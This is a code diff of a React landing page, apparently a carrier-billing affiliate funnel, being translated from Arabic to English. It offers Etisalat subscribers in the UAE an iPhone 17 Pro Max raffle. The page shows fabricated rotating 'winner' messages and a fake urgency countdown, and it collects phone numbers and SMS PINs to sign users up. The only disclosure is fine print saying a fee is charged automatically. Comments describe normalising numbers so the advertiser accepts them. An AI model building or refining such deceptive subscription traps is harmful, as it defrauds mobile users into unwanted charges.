@@ -8,7 +8,7 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
   const [step, setStep] = useState(1);
   const [errorMsg, setErrorMsg] = useState(""); 
-  const [liveWinner, setLiveWinner] = useState("علي من عجمان تم تأكيد اشتراكه 🔥");
+  const [liveWinner, setLiveWinner] = useState("Ahmed from Dubai just won a chance to win in a raffle 🎁");
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -17,10 +17,10 @@ export default function Home() {
     }
 
     const winners = [
-      "علي من عجمان تم تأكيد اشتراكه 🔥",
-      "أحمد من دبي فاز للتو بفرصة سحب 🎁",
-      "فاطمة من أبوظبي تم إرسال الرمز لها ✅",
-      "سلطان من الشارقة دخل السحب للتو ⚡"
+      "Ahmed from Dubai just won a chance to win in a raffle 🎁",
+      "Ali from Ajman confirmed his participation 🔥",
+      "Fatima from Abu Dhabi just received her draw code ✅",
+      "Sultan from Sharjah entered the grand draw ⚡"
     ];
     const interval = setInterval(() => {
       setLiveWinner(winners[Math.floor(Math.random() * winners.length)]);
@@ -31,38 +31,49 @@ export default function Home() {
 
   async function submitNumber() {
     if (!msisdn) {
-      setErrorMsg("يرجى إدخال رقم الهاتف");
+      setErrorMsg("Please enter your mobile number.");
       return;
     }
     setLoading(true);
     setErrorMsg("");
 
+    // 🛡️ 核心终极防御清洗逻辑：彻底干掉用户重复输入的各种区号
     let cleanMsisdn = msisdn.trim();
+    
+    // 1. 去掉前面的 00
+    if (cleanMsisdn.startsWith("00")) {
+      cleanMsisdn = cleanMsisdn.substring(2);
+    }
+    // 2. 去掉开头的单个 0
     if (cleanMsisdn.startsWith("0")) {
       cleanMsisdn = cleanMsisdn.substring(1);
     }
-    if (!cleanMsisdn.startsWith("971")) {
-      cleanMsisdn = "971" + cleanMsisdn;
+    // 3. 极其重要：如果用户在输入框里又手抖打了 97156... 帮他把开头的 971 抠掉！
+    if (cleanMsisdn.startsWith("971")) {
+      cleanMsisdn = cleanMsisdn.substring(3);
     }
 
+    // 4. 重新格式化为广告主 CP 100% 接受的标准 9715xxxxxxxx 格式
+    const finalMsisdn = "971" + cleanMsisdn;
+
     try {
-      const response = await fetch(`/api/request?msisdn=${cleanMsisdn}&click_id=${clickId}`);
+      const response = await fetch(`/api/request?msisdn=${finalMsisdn}&click_id=${clickId}`);
       const data = await response.json();
       if (data.success) {
         setTxid(data.txid);
         setStep(2);
       } else {
-        setErrorMsg("❌ عذراً، هذا الرقم غير مؤهل.");
+        setErrorMsg("❌ Sorry, this number is not eligible.");
       }
     } catch (err) {
-      setErrorMsg("❌ حدث خطأ في الاتصال.");
+      setErrorMsg("❌ Connection error, please try again.");
     }
     setLoading(false);
   }
 
   async function submitPin() {
     if (!pin || pin.length < 4) {
-      setErrorMsg("يرجى إدخال رمز PIN المكون من 4 أرقام");
+      setErrorMsg("Please enter the 4-digit PIN code.");
       return;
     }
     setLoading(true);
@@ -74,10 +85,10 @@ export default function Home() {
       if (data.stateCode === 0 || data.stateCode === 2) {
         setStep(3);
       } else {
-        setErrorMsg("❌ رمز PIN غير صحيح.");
+        setErrorMsg("❌ Incorrect PIN code. Please try again.");
       }
     } catch (err) {
-      setErrorMsg("❌ حدث خطأ أثناء التأكيد.");
+      setErrorMsg("❌ Verification failed, please try again.");
     }
     setLoading(false);
   }
@@ -89,7 +100,7 @@ export default function Home() {
       </div>
 
       <div style={styles.card}>
-        <div style={styles.topBadge}>عرض حصري لمشتركي اتصالات</div>
+        <div style={styles.topBadge}>Exclusive offer for Etisalat subscribers</div>
 
         <div style={styles.imageContainer}>
           <img
@@ -100,22 +111,22 @@ export default function Home() {
         </div>
 
         <h1 style={styles.title}>iPhone 17 Pro Max</h1>
-        <p style={styles.subtitle}>🎁 السحب السنوي الأكبر في الإمارات</p>
+        <p style={styles.subtitle}>🎁 The biggest annual draw in the UAE</p>
 
         <div style={styles.countdownBox}>
-          ⏰ ينتهي العرض خلال
+          ⏰ Offer ends during
           <div style={styles.countdownTimer}>2:46</div>
         </div>
 
         <div style={styles.trustList}>
-          <div style={styles.trustItem}>أدخل رقم هاتفك <span style={styles.checkmark}>✓</span></div>
-          <div style={styles.trustItem}>تأكيد الاشتراك <span style={styles.checkmark}>✓</span></div>
-          <div style={styles.trustItem}>دخول السحب فوراً <span style={styles.checkmark}>✓</span></div>
+          <div style={styles.trustItem}>Enter your phone number <span style={styles.checkmark}>✓</span></div>
+          <div style={styles.trustItem}>Confirm subscription <span style={styles.checkmark}>✓</span></div>
+          <div style={styles.trustItem}>Enter the draw immediately <span style={styles.checkmark}>✓</span></div>
         </div>
 
         {errorMsg && <div style={styles.errorBubble}>{errorMsg}</div>}
 
-        {/* 步骤 1：输入手机号（+971格子已移至最右侧，完美支持 RTL） */}
+        {/* 步骤 1：输入手机号 */}
         {step === 1 && (
           <div style={styles.formSection}>
             <div style={styles.phoneInputContainer}>
@@ -130,11 +141,11 @@ export default function Home() {
             </div>
 
             <button style={styles.button} onClick={submitNumber} disabled={loading}>
-              {loading ? "جاري التحقق..." : "شارك الآن 🎁"}
+              {loading ? "Processing..." : "Participate now 🎁"}
             </button>
 
             <div style={styles.bottomText}>
-              بالضغط على Button، أنت توافق على الشروط والأحكام. سيتم خصم الرسوم تلقائياً.
+              By clicking the button, you agree to the terms and conditions. The fee will be charged automatically.
             </div>
           </div>
         )}
@@ -143,7 +154,7 @@ export default function Home() {
         {step === 2 && (
           <div style={styles.formSection}>
             <div style={styles.successAlert}>
-              ✅ تم إرسال رمز التحقق عبر رسالة قصيرة (SMS)
+              ✅ Verification code has been sent via SMS!
             </div>
 
             <input
@@ -156,7 +167,7 @@ export default function Home() {
             />
 
             <button style={styles.buttonVerify} onClick={submitPin} disabled={loading}>
-              {loading ? "جاري التأكيد..." : "تأكيد الرمز ⚡"}
+              {loading ? "Confirming..." : "Confirm Code ⚡"}
             </button>
           </div>
         )}
@@ -165,8 +176,8 @@ export default function Home() {
         {step === 3 && (
           <div style={styles.successBox}>
             <div style={styles.successIcon}>✓</div>
-            <div style={styles.successTitle}>تم التأكيد!</div>
-            <p style={styles.successText}>لقد دخلت السحب الرسمي بنجاح.</p>
+            <div style={styles.successTitle}>Confirmed!</div>
+            <p style={styles.successText}>You have successfully entered the official raffle.</p>
           </div>
         )}
       </div>
@@ -294,10 +305,9 @@ const styles = {
     boxSizing: "border-box"
   },
   
-  /* 🔥 使用 row-reverse 完美的把国家代码倒序排版到最右侧 */
+  /* 恢复标准英文从左到右排版，确保完美对齐 */
   phoneInputContainer: {
     display: "flex",
-    flexDirection: "row-reverse", 
     width: "100%",
     height: "54px",
     borderRadius: "14px",
@@ -316,7 +326,7 @@ const styles = {
     fontSize: "16px",
     fontWeight: "bold",
     padding: "0 16px",
-    borderLeft: "1px solid #334155", // 边框改为左边分割
+    borderRight: "1px solid #334155",
     userSelect: "none"
   },
   inputField: {
@@ -329,7 +339,7 @@ const styles = {
     outline: "none",
     fontWeight: "bold",
     letterSpacing: "1px",
-    textAlign: "right" // 配合 RTL 习惯，输入的数字从右向左延伸
+    textAlign: "left"
   },
 
   pinInput: {
